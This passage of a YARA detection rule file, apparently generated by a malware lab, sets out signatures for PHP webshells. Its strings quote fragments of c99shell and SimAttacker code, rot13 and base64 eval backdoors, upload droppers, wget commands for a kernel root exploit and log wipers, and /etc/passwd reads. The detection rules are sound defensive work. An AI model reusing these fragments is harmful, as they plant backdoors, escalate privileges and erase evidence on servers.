      $s13 = "UZruXXl7OqUw8CquZLmbunMBjprp2fX8+wX1KIDDP5YJHV4KHaHNBpiYp/v66c/OBVfoRMVDW1vPRqfwHf8QlX2DJXyg0vx+yDZzOfhevPJhDspyNKIgm317EqZtYDv2" ascii
      $s14 = "sC4vA4VjSHrTgjcEt2pCjAeCCtgE4imedZGET2LrPgxWquWtiGUUTOpTLio+z8dkLjE/rnnqu/N1a8Ib8NGc49q0cyuly7GnGa9jMdwIHzDoMQlNRoVJLvlpXU6Wtyoh" ascii
      $s15 = "1cXe2VS6EURbszuIyZZ9FigLFBjbHFY+LulraQB1Pa6h3AhRQHvB5e/KofElWwB25+jXjmErtS4CIcKsEWAZFLAsi362RCqqQ/23GzO8LgVLYSeHsQgQyztjt1pLOGj5" ascii
      $s16 = "b7QwgTm7wfym5u2tOd+zln/ktGfCjLE1zNaTOAxxThHyUzVTgs/tMRGVakc7Uigp/KLvnv13TRXraFv4dllXNqend5r6xuNuBgw9QxNS87UoOvoJcTWKeGPrWxUL4X9E" ascii
      $s17 = "$pass=\"8cd59f852a590eb0565c98356ecb0b84\";" fullword ascii
      $s18 = "+Ie0FbwitRt3w9lhQWJSPPuTZIbr9i3n9ag0nTPNffWLt/3JvVHOkjH08exvnyINp19+TZ8PGtj1M4OZ9p74SG+1lRTyT84sTSHXJJDKHnpXaLbh6j5FBQQ8HXl2XX98" ascii
      $s19 = "9646aGfviHcFzM2u/Pz6N/buaiNTzAL+wYUaicQSInv4MMNqITgWMS52zLKNLXmDfaYpFX0bmL5sCq6ZR38EnyYogLVwQNF8JprXeS7sNyw4TJtwWrJS3o3a5DBsHG5+" ascii
      $s20 = "nHjiWAPa8sbJgI2ZR/7l/KCMhVrjZinShMtu5KIyvn1jo0N/c4fQ/n0R2BxQxamkeywpOo8XhiPiyxnYf8+RkQ55fw+0Ow873Kl/ip7PGgL3iwnj2KAkGi09+K2gtM/0" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_1b836517164c18caf2c92ee2a06c645e26936a0c
{
   meta:
      description = "php17 - file 1b836517164c18caf2c92ee2a06c645e26936a0c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "de4560335dc3fca28c6be33d682d36b9fbdf013b72c62e6836cceee9e96b0da1"
   strings:
      $x1 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n\\n\");" fullword ascii
      $s2 = "$table_dump=isset($_POST['table_dump'])?$_POST['table_dump']:'';" fullword ascii
      $s3 = "$result2=mysql_query('select * from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s4 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\".gz\\n\\n\");" fullword ascii
      $s5 = "$db_dump=isset($_POST['db_dump'])?$_POST['db_dump']:'';" fullword ascii
      $s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword ascii
      $s7 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\"\\n\\n\");" fullword ascii
      $s8 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword ascii
      $s9 = "<input name='action' value='download' type=submit onclick=\"work_dir.value=document.main_form.work_dir.value;\">" fullword ascii
      $s10 = "<tr><td>DB :</td><td><input type=text name='db_dump' value='<?=$db?>'></td></tr>" fullword ascii
      $s11 = "$dump_file.=($rows2[$k]==''?'null);':'\\''.addslashes($rows2[$k]).'\\');').\"\\n\";" fullword ascii
      $s12 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii
      $s13 = "$result2=@mysql_query('show columns from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s14 = "<tr><td>Only Table :</td><td><input type=text name='table_dump'></td></tr>" fullword ascii
      $s15 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword ascii
      $s16 = "if(!@copy($_FILES[\"filename\"][\"tmp_name\"], $work_dir.$f)) echo('Upload is failed');" fullword ascii
      $s17 = "if(!$result2)echo('error table '.$table_dump);" fullword ascii
      $s18 = "hn.barker446@gmail.com\";mail($sd98, $sj98, $msg8873, \"From: $sd98\");" fullword ascii
      $s19 = "$page=isset($_POST['page'])?$_POST['page']:(isset($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:'');" fullword ascii
      $s20 = "$temp_file=isset($_POST['temp_file'])?'on':'nn';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule sig_4821ac3bc5069a0846ba67e2c2f86cb6fcf30183
{
   meta:
      description = "php17 - file 4821ac3bc5069a0846ba67e2c2f86cb6fcf30183.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1afa3eff644185da1edb57f2c164af5e4dd12d2e97776bea00d404af9ee8fc77"
   strings:
      $s1 = "$content = 'helloworld';" fullword ascii
      $s2 = "if (fwrite ($fp, $content))" fullword ascii
      $s3 = "eval(str_rot13('riny($_CBFG[pzq]);'));" fullword ascii
      $s4 = "echo str_rot13('riny($_CBFG[pzq]);');" fullword ascii
      $s5 = "die (\"error\");" fullword ascii
      $s6 = "$filename = end(explode('/',$url));" fullword ascii
      $s7 = "//$filename = end(explode('/',$url));" fullword ascii
      $s8 = "$fp = fopen (\"$filename\",\"w\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_7fea214e8d5f593f237815ecba105ccb03c8e572
{
   meta:
      description = "php17 - file 7fea214e8d5f593f237815ecba105ccb03c8e572.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "eb9f14e0494b45920700321f67454be3d3d1e5e92ea814bea9e21687a51888d8"
   strings:
      $x1 = "$shellUser = ''.exec( whoami ).'@'.exec( hostname ).'';" fullword ascii
      $s2 = "//Executes the shell command" fullword ascii
      $s3 = "<center><a href=\"editor.php\">Editor</a> |  <a href=\"sudoShell.php\">sudo Shell</a> | <a href=\"index.php\">Home</a></center>" fullword ascii
      $s4 = "<iframe src=\"commands.txt\" height=\"400px\" width=\"700px\"></iframe>" fullword ascii
      $s5 = "$output = shell_exec( $command );" fullword ascii
      $s6 = "//Gets the command to be executed" fullword ascii
      $s7 = "$history = ''.$shellUser.'$ '.$command.'" fullword ascii
      $s8 = "<form action=\"shell.php\" method=\"post\">" fullword ascii
      $s9 = "$histFile = 'commands.txt';" fullword ascii
      $s10 = "header( 'Location: login.html' );" fullword ascii
      $s11 = "$xstHist = file_get_contents( $histFile );" fullword ascii
      $s12 = "<input type=\"submit\" value=\"execute\">" fullword ascii
      $s13 = "<input type=\"text\" style=\"width: 630px\" name=\"command\">" fullword ascii
      $s14 = "//Writes commands and the results to the command history file" fullword ascii
      $s15 = "<input type=\"submit\" value=\"Clear command history\">" fullword ascii
      $s16 = "<form action=\"clrHist.php\" method=\"post\">" fullword ascii
      $s17 = "$command = $_POST['command'];" fullword ascii
      $s18 = "<title>Rasputin Webshell</title>" fullword ascii
      $s19 = "if ( !isset( $_SESSION['username'] ) ) {" fullword ascii
      $s20 = "$file = fopen( $histFile, 'w' );" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule sig_15ddfe956e731cb543fd456c4f40bbfbe6706694
{
   meta:
      description = "php17 - file 15ddfe956e731cb543fd456c4f40bbfbe6706694.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5f899a9b3198d96727584acc457207045f1482c45c4c293631512a620404ffb2"
   strings:
      $s1 = "<?php $ad = '|';$ad .='.';$ad .='*|';$ad .='e';@preg_filter('|.*|e', $_REQUEST['1'], ''); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_37d2c2e4f0bd223cee2e4c01c1d2985be69d99e5
{
   meta:
      description = "php17 - file 37d2c2e4f0bd223cee2e4c01c1d2985be69d99e5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffb6f27d13576c025bb8f823afc625a3d49176f0b421d8aba1d9134f6a58ac1c"
   strings:
      $s1 = "'f'/><input type='submit' value='up'/></form><?php echo @copy($_FILES['f']['tmp_name'],$_FILES['f']['name'])?'ok':'no';?>" fullword ascii
      $s2 = "<?php @set_time_limit(0);@header('null77: pOinter');?><form method='POST' enctype='multipart/form-data'><input type='file' name=" ascii
      $s3 = "<?php @set_time_limit(0);@header('null77: pOinter');?><form method='POST' enctype='multipart/form-data'><input type='file' name=" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_25782c2ea1db14e0131e8bcbb3e11587d66478ef
{
   meta:
      description = "php17 - file 25782c2ea1db14e0131e8bcbb3e11587d66478ef.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "69b9d55ea2eb4a0d9cfe3b21b0c112c31ea197d1cb00493d1dddc78b90c5745e"
   strings:
      $s1 = "$qwery45234dws = $z2342345gk7456{28} . $z2342345gk7456{29} . $z2342345gk7456{27} . $z2342345gk7456{27} . $z2342345gk7456" fullword ascii
      $s2 = "345gk7456{13} . $z2342345gk7456{14} . $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{13} . $z2342345gk7456{14};" fullword ascii
      $s3 = "$zsweqwq4546dgh = $z2342345gk7456{16} . $z2342345gk7456{35} . $z2342345gk7456{18} . $z2342345gk7456{23} . $z2342345gk745" fullword ascii
      $s4 = "$as346hgjkhfg = $z2342345gk7456{11} . $z2342345gk7456{10} . $z2342345gk7456{28} . $z2342345gk7456{14} . $z2342345gk7456{" fullword ascii
      $s5 = "$owe342wfbjdewqre34 = $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{23} . $z2342345gk7456{31} . $z2342345g" fullword ascii
      $s6 = "$rt4534fhghj5 = $z2342345gk7456{28} . $z2342345gk7456{29} . $z2342345gk7456{27} . $z2342345gk7456{36} . $z2342345gk7456{" fullword ascii
      $s7 = "$z2342345gk7456 = str_rot13(gzinflate(str_rot13(base64_decode(\"MzQyNjE1M7ewNMjLLygsKi4pLSuvqKxXWVdBVlpYz8jMys7JjQcA\"))));" fullword ascii
      $s8 = "27} . $z2342345gk7456{24} . $z2342345gk7456{29} . $z2342345gk7456{0} . $z2342345gk7456{2};" fullword ascii
      $s9 = "6{15} . $z2342345gk7456{21} . $z2342345gk7456{10} . $z2342345gk7456{29} . $z2342345gk7456{14};" fullword ascii
      $s10 = "} else if ($a == \"ax4564365dgvbmnmhu56fgvgvc//gygyugu\") {" fullword ascii
      $s11 = "6{24} . $z2342345gk7456{13} . $z2342345gk7456{14};" fullword ascii
      $s12 = "$zxAwx0XtrY0189j0KKxaz0 = \"aX0grtyu456RtO8\";" fullword ascii
      $s13 = "<?php function aX0grtyu456RtO8($a, $b) {" fullword ascii
      $s14 = "} else if ($a == \"zs3454sdfcvnyrertc_gygu\") {" fullword ascii
      $s15 = "function aX0grtyu456RtO8($a, $b) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule _themosisDateField_blade
{
   meta:
      description = "php17 - file _themosisDateField.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "20d2fa19a74dc3ff3675ec7e3277dce70ec135b3f2e3c2944f0356dfe928bf44"
   strings:
      $s1 = "{!! Themosis\\Facades\\Form::date($field['name'], $field['value'], $field['atts']) !!}" fullword ascii
      $s2 = "<p class=\"description\">{!! $field['features']['info'] !!}</p>" fullword ascii
      $s3 = "@if(isset($field['features']['info']))" fullword ascii
   condition:
      uint16(0) == 0x217b and filesize < 1KB and
      all of them
}

rule add_to_sets
{
   meta:
      description = "php17 - file add_to_sets.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b647e63dc6e9851adbc7d4f3f3584daafc1854e88d090d14a74257a59765209c"
   strings:
      $s1 = "var _checkbox = _.template($('script.ccm-template-file-set-checkbox').html());" fullword ascii
      $s2 = "$('input[data-field=file-set-search]').liveUpdate('ccm-file-set-list', 'fileset').closest('form').unbind('submit.liveupdate');" fullword ascii
      $s3 = "<?php defined('C5_EXECUTE') or die(\"Access Denied.\"); ?>" fullword ascii
      $s4 = "<script type=\"text/template\" class=\"ccm-template-file-set-checkbox\">" fullword ascii
      $s5 = "<span data-label=\"file-set-name\"><?=$fs->getFileSetDisplayName()?></span>" fullword ascii
      $s6 = "<a href=\"#\" class=\"icon-link\"><i class=\"fa fa-minus-circle\"></i></a>" fullword ascii
      $s7 = "$sets = FileSet::getMySets();" fullword ascii
      $s8 = "<input type=\"text\" placeholder=\"<?=t('Set Name')?>\" class=\"form-control\" name=\"fsNew[]\">" fullword ascii
      $s9 = "<?php echo $getCheckbox($fs);" fullword ascii
      $s10 = "$('button[data-action=add-file-set]').on('click', function() {" fullword ascii
      $s11 = "div.form-group-file-set-checkbox a {" fullword ascii
      $s12 = "div.form-group-file-set-checkbox {" fullword ascii
      $s13 = "$('#ccm-file-set-list').on('click', 'a', function(e) {" fullword ascii
      $s14 = "left: -20px;" fullword ascii
      $s15 = "var $row = $(this).parents('.input-group');" fullword ascii
      $s16 = "$('#ccm-file-set-list').append(_checkbox)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule sig_1626580cc64569879a427931137aa9c2434d2c8c
{
   meta:
      description = "php17 - file 1626580cc64569879a427931137aa9c2434d2c8c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c3db747c7f3d5d350e1c5bfe54200aa727b335bb4e5123d67ef9102aefdaa331"
   strings:
      $s1 = "echo \"<br>Connect back Shell , bypass Firewalls<br>" fullword ascii
      $s2 = "echo \"<br><center><h3> CMD ExeCute </h3></center>\" ;" fullword ascii
      $s3 = "echo \"<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>\" ;" fullword ascii
      $s4 = "//fake mail = Use victim server 4 DOS - fake mail " fullword ascii
      $s5 = "<title>SimAttacker - Version : 1.0.0 - Edited By KingDefacer</title>" fullword ascii
      $s6 = "echo \"<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download\";" fullword ascii
      $s7 = "CMD</font></span></a><font face=\"Tahoma\" size=\"2\"> Shell</font></b></p>" fullword ascii
      $s8 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword ascii
      $s9 = "//Connect Back -Firewall Bypass" fullword ascii
      $s10 = "header(\"Content-Disposition: attachment; filename=$entrypath\");" fullword ascii
      $s11 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword ascii
      $s12 = "echo \"<script language='javascript'> alert('Sending Mail - please waite ...')</script>\";" fullword ascii
      $s13 = "$result=shell_exec(\"$cmd\");" fullword ascii
      $s14 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {" fullword ascii
      $s15 = "//cmd-command line" fullword ascii
      $s16 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword ascii
      $s17 = "header(\"Content-Length: \" . filesize($name));" fullword ascii
      $s18 = "echo \"<script language='javascript'> alert('\\:D Successfully uploaded.!')</script>\";" fullword ascii
      $s19 = "<span style=\"text-decoration: none\"><font color=\"#000000\">File Manager</font></span></a></font></span></font></b></p>" fullword ascii
      $s20 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule sig_01e9565cecc4e989123f9620c1d09c09
{
   meta:
      description = "php17 - file 01e9565cecc4e989123f9620c1d09c09.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9711738fbc89cd6b37366690193dfdd6402af920106426ff9d33aae65eaba5c8"
   strings:
      $x1 = "<OPTION VALUE=\"wget http://www.synsta.templatez.org/1.txt\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 1)" fullword ascii
      $x2 = "<OPTION VALUE=\"wget http://www.synsta.templatez.org/1.txt\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit" fullword ascii
      $x3 = "<OPTION VALUE=\"mv 1.txt exploit.c\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 2)" fullword ascii
      $x4 = "<OPTION VALUE=\"gcc exploit.c -o exploit\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 3)" fullword ascii
      $x5 = "<form action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" " ascii
      $x6 = "<OPTION VALUE=\"./vanish <? echo exec('whoami'); ?> <? echo $_SERVER[\"REMOTE_ADDR\"]; ?> <? echo gethostbynam" fullword ascii
      $x7 = "echo \"Result Of Locally Executed Command: <b>$execcmd</b></br>\";" fullword ascii
      $x8 = "<OPTION VALUE=\"wget http://packetstormsecurity.org/UNIX/penetration/log-wipers/logcleaner-0.3.c\">Wipelogs (Part 1)(Zap3)" fullword ascii
      $x9 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/vanish.c\">Wipelogs (Part 1)(Vanish)" fullword ascii
      $x10 = "<OPTION VALUE=\"which wget curl w3m lynx\">Check For Downloaders (WGET, et cetera)" fullword ascii
      $x11 = "<OPTION VALUE=\"./exploit\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 4)" fullword ascii
      $x12 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/vanish.c\">Wipelogs (Part " fullword ascii
      $x13 = "$fqb_log = \"FTP Quick Brute (called c99shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s14 = "$logfile = $tmpdir_logs.\"ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s15 = "<OPTION VALUE=\"./vanish <? echo exec('whoami'); ?> <? echo $_SERVER[\"REMOTE_ADDR\"]; ?> <? echo gethostbyname($_SERVER[\"HTTP_" ascii
      $s16 = "echo(\"<b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $s17 = "<OPTION VALUE=\"wget http://packetstormsecurity.org/UNIX/penetration/log-wipers/logcleaner-0.3.c\">Wipelogs (P" fullword ascii
      $s18 = "<OPTION VALUE=\"cat /var/cpanel/accounting.log\">Get cpanel logs" fullword ascii
      $s19 = "<OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c <?php passthru('pwd'); ?>\">Tar your current directory. (Only works if the dir" fullword ascii
      $s20 = "t=\"en-us\"><title>shell@<?php echo getenv(\"HTTP_HOST\"); ?></title><STYLE>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}

rule sig_9b90e63b214638bdd071d67a899d24d0877ed276
{
   meta:
      description = "php17 - file 9b90e63b214638bdd071d67a899d24d0877ed276.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "094edcddc0ecda87048d02f4c88c33bdb00489552793e5d560d80237c41ab002"
   strings:
      $s1 = "<?php echo$_SERVER['SERVER_NAME']?>(<?php echo@gethostbyname($_SERVER['SERVER_NAME'])?>)<br>" fullword ascii
      $s2 = "if ($_GET[pass]==$password){" fullword ascii
      $s3 = ":<input type=\"text\" name=\"lujing\" id=\"lujing\" value='<?php echo $_SERVER[\"SCRIPT_FILENAME\"]?>' />" fullword ascii
      $s4 = ":<input type=\"password\" name=\"pass\" id=\"pass\">" fullword ascii
      $s5 = "$password=\"keio\";/**" fullword ascii
      $s6 = "#shc{font-family:Georgia;background:#fff;width:63px;height:20px;border=#0000 1px solid}" fullword ascii
      $s7 = "if(fwrite($fo,$_POST[\"neirong\"]))" fullword ascii
      $s8 = "<form action=\"\" method=\"GET\">" fullword ascii
      $s9 = "$fo=fopen($_POST[\"lujing\"],\"w\");" fullword ascii
      $s10 = ":<?php echo $_SERVER[\"SCRIPT_FILENAME\"]?>" fullword ascii
      $s11 = "#neirong{width:558px;height:250px;border=#0000 1px solid}" fullword ascii
      $s12 = "#lujing{font-family:Georgia;width:389px;border=#0000 1px solid}" fullword ascii
      $s13 = "if ($_POST)" fullword ascii
      $s14 = "IP <?php echo $_SERVER['SERVER_NAME']?></title>" fullword ascii
      $s15 = "<textarea name=\"neirong\" id=\"neirong\">" fullword ascii
      $s16 = "<input type=\"submit\" id=\"shc\" value=\"" fullword ascii
      $s17 = "<input type=\"submit\" name=\"denglu\" value=\"" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 4KB and
      8 of them
}

rule sig_6f53dce817b117198fc0950d87e362fdcf7852e2
{
   meta:
      description = "php17 - file 6f53dce817b117198fc0950d87e362fdcf7852e2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1dc571ae9a2775e50505fa455a9d32b6953bc00e16afbe7fc225e8993b2e6c7a"
   strings:
      $x1 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "if ($win) {$file = \"C:\\\\tmp\\\\dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x3 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x4 = "# \".gethostbyname($SERVER_ADDR).\" (\".$SERVER_ADDR.\")\".\" dump db \\\"\".$db.\"\\\"" fullword ascii
      $x5 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x6 = "else {$file = \"/tmp/dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x7 = "else {echo \"<b>Execution command</b>\";  if (empty($cmd_txt)) {$cmd_txt = true;}}" fullword ascii
      $x8 = "if (file_get_contents($v)) {echo \"<b><font color=\\\"red\\\">You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s9 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s10 = "$out = \"# Dumped by C99Shell.SQL v. \".$shver.\"" fullword ascii
      $s11 = "if (md5(sha1(md5($anypass))) == \"b76d95e82e853f3b0a81dd61c4ee286c\") {header(\"HTTP/1.0 200 OK\"); @eval($anyphpcode);}" fullword ascii
      $s12 = "# MySQL version: (\".mysql_get_server_info().\") running on \".$SERVER_ADDR.\" (\".$SERVER_NAME.\")\".\"" fullword ascii
      $s13 = "if (eregi(\"%%%filedata%%%\",$data)) {$data = str_replace(\"%%%filedata%%%\",file_get_contents($v),$data);}" fullword ascii
      $s14 = "service.pwd */ $aliases[] = array(\"find service.pwd files in current dir\", \"find . -type f -name service.pwd\");" fullword ascii
      $s15 = "if (!$sock) {echo \"I can't connect to localhost:\".$bind[port].\"! I think you should configure your firewall.\";}" fullword ascii
      $s16 = "header(\"Content-disposition: attachment; filename=\\\"\".$f.\".txt\\\";\"); " fullword ascii
      $s17 = "config.inc.php */ $aliases[] = array(\"find config.inc.php files\", \"find / -type f -name config.inc.php\");" fullword ascii
      $s18 = "if (!empty($kill)) {$query = 'KILL ' . $kill . ';'; $result = mysql_query($query, $sql_sock); echo \"<b>Killing process #\".$" fullword ascii
      $s19 = "$acts = array(\"\",\"newdb\",\"serverstat\",\"servervars\",\"processes\",\"getfile\");" fullword ascii
      $s20 = "else {echo \"<br><a href=\\\"\".$surl.\"act=lsa&nixpasswd=1&d=\".$ud.\"\\\"><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule php17_admin
{
   meta:
      description = "php17 - file admin.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1d6e30a09dda4ab66a303014e731db26dec693240adc1fbb72adb394e9b3d7b6"
   strings:
      $s1 = "eval(gzinflate(base64_decode('HZzHkqtQlkXn9SNdFQzwLtpU4IW3wk068E54z9c32cOXEdKDe+/Ze60UqX//z3/9e6qnf/yjOJLfP6unGcpfshX/TJO1ILD/zY" ascii
      $s2 = "gFGRUoInZ7YI6STXSTLhwrsy9A5a4shyUlVWYwuHE8Dyuf+jmolaSwhhoavE9J6yhJEZQlBxZqZTLtLWEVHg965FkwvGW80yJG9StXtnvbP+KTl4k/TzTeYESAtF+BD0" ascii
      $s3 = "qXpejHfV2NEo68pwunQg/uYU0HZuPmlSUc+oGsati4wvCtPfH6Duu4g9Rto9K0a+71Pefbds2RuUDllJtzHzt4eCxRAiVoWo1MoAO/9ycMqjktkPpBIzQw5M2rPIQqwG" ascii
      $s4 = "U33uEnaaN2t4Vi9OuE4sM5l80t+ypG8u+ctPptZyTl1EESf+7wM717NZ4VkSqxLgetdCJJiyTUWHaZmkMAMzlnY1sYfn8sO6qRmVsZZIsBDeZyzXFAJ12vw4LUsadcPn" ascii
      $s5 = "og1FjMfGVqYG0JaQrY9bhT+AUeqpftPJfceqdTPJHoVzifyDW0c/2Kt58fPuhKlTdYfx82+Yx/dQ28FMtJ+x44q+IPp5HNztjIB9ixwSt7dIiGvVq1qBXYwiEDgK78VW" ascii
      $s6 = "1wzp26qyKaBGkYvsnnSlm9vXs10gju2+lNVAvfainKo0HB8tMuPW2qnM1tGfTp2J0tgwaM+5KBF0Vgm2j6ufc58g9sknNPl4BwP1r3A6t1or6Mw3fPk1ISCgj7kzZ3k+" ascii
      $s7 = "UcZY9NhrI9e+6vB1t9VgM18Xn+VN8Ykd/LgUScda4PQaCufOIr4uFnRw0vuljEYetJCPudCmAkMCSm2XrkR2jF17nOvj5hP/4+Kvix0GGqufLvG5REYuys52DXBwNoO/" ascii
      $s8 = "pHJUxTUM9Fb36wU46WBRO6sX/2jo32c9TJmX0co4ks9PwYYjlyNEIrg/blu9EDTQOKwTYUVcLpLJO/UA8bpfia35JkokFlOgwbBKOJdVLoFywPsy+Xsg22Ww9ZiQ0lzB" ascii
      $s9 = "BnIaPvGwPua5YMYsQx32OaeYjYwAPP2E5MqUDdcomvn3wM7bfJ4rGRNDYA6nSvYNrfzx8NZD9cXLSDgY8OMNkv1oN6/zspcH32KcQhPfOirBRlxQl/G5dfiVDMRDn/TA" ascii
      $s10 = "YkJn6vpw9TmX04RpYMwEIED1htl8YBin1w6L3/ceBN+TXcyRXvsGHWkLHbbJJmRU+8s43uMoDibPjfW6+kqaNL1MAHMmo47mtpasK7Su9vaXl0YYbfjJyRjAb16xt45M" ascii
      $s11 = "iX+6PI8ntIZFQt7mhFfKoOMlPB+zQyKLM9b3SUWDvxVJ4L9lRGiwKaRUnXIN9R1bYM5YU8i3BO2IEvLXqSrDJngQyaCz+3IuQsIfhT5LTUJejO7ba2mEsn3GfXTZ/fah" ascii
      $s12 = "gcy5yP7aM6uPdOrgmiDRwRysuhM8VtiB8xpptc4FHLGjcJUj5qn9ALAtYnl+dJjKcA0FjwBRMIBI244Lw0ALpjRGdx0u04LoGYgYEWcenXDJxprg8paoEuqivb2gXX4M" ascii
      $s13 = "MogJ45wRV5urFPifkNm4rdWYH7FQpjjiDDdZE//453CLw+JaO4bCq0zb5MulBQGF3g1KlTygSHr2YkTF+P0SyRJez2YMHQKIXvuxN32K7WhFs7++UE/L0sZsMyJm7gfD" ascii
      $s14 = "TfbXWL5wa14L4tPgB7KEZVLIRZlA9LJu7vA//9ktiHiKkMaZTXd67HVL233UTtHB5UxXfECvhJy2d8Cnk8QY/xE2CrGQ7Xd/dOcBzapENJA2FoCpFyBRVNQyUeNUZCFR" ascii
      $s15 = "tszIt//ocYo59sN6q8S1HqVgvVve0vOqxqYNtmUhjc0/EOg1spsvhTMMOOqYI0eJj29+hKkERREMSNjQZBVacgQCrpfDPhmN9xD3hyblVIC1D1CdCoCQQVNzlQiQog+n" ascii
      $s16 = "qC0eIhPSySiQLyu3Z84+sEzvk72Rs1Y8WJIb8XaHVcnq952MxwZdEj0TmqWpn//xGJsoCGNSyA5Dxrt/KE7fM5g8C1xnDwQof8xhzde+zaTkPckJFkmaC0DiwpPitFqz" ascii
      $s17 = "MmLdbS3s8QYQUD5KZMx7+aI6TSq3y503Cd2WoKHhds8EKEeEpSnP7EIe1RMZ///lx4EmrvZ56fMPzCCxRmUHzV4m3cqQQATmO9nSCYY0uXqicPlPFpkFkSDU/IIqVOx2" ascii
      $s18 = "a/0XAKHMk1biLQYTrG81vKoKKZMXnbprMzvsHy23Qk1XR2nGzdNYKsl3CyR3ahGfzrvLtThgBZwmv7lkEhkvbQSHOYDUME6549LURlLfFFF/HBjG19LLEfr9/NSfkeW1" ascii
      $s19 = "lue+oLP+w2k/DLrhSLGCKF0pn6uLNxXOQUA5I5a6rPN5OFuHRTJBjzkX9NX4AhoW/hV4pOm8FhlUvUenJQ/9SXiUyrM68GLxnD0490Lrh4Jvh+Mksft9i14Gd3Fdc/dH" ascii
      $s20 = "qwxRqWn/JYQI0H1v54jCX9Ek3CIBI1kBlnXdXl/xJ36vqvQCZSWv8u+zfiehMAX7HIEAqyyVY/9RNiQgdLPiDS+feeDHEAhMfkmfYtXDxaeH1aqcEXA3jy1KZP2sqC/W" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      8 of them
}

rule php17_article
{
   meta:
      description = "php17 - file article.php"
      author = "WatcherLab"
      date = "2019-02-23"
